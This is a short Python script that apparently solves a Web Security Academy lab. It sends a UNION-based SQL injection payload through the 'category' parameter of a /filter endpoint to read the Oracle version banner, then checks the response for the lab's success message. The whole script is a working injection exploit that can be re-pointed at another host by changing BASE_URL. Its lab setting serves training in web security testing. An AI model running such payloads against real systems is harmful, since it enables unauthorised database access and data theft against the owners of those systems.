import requests
from urllib.parse import urlparse

BASE_URL = "https://0ab8009f03a170cb8042678c00af0038.web-security-academy.net"  # Change

session = requests.Session()

payload = "' UNION SELECT NULL, banner FROM v$version--"  # See the payloads in the lab-notes

print("[+] Sending SQL injection payload:", payload)

response = session.get(
    f"{BASE_URL}/filter",
    params={"category": payload},
    timeout=10
)

print("[+] Injection request:", response.status_code)
print("[+] Requested URL:", response.url)

if "Congratulations, you solved the lab!" in response.text:
    print("\n[SUCCESS] Lab solved!")
else:
    print("\n[-] Success message not detected.")
    print("Check the response in your browser.")

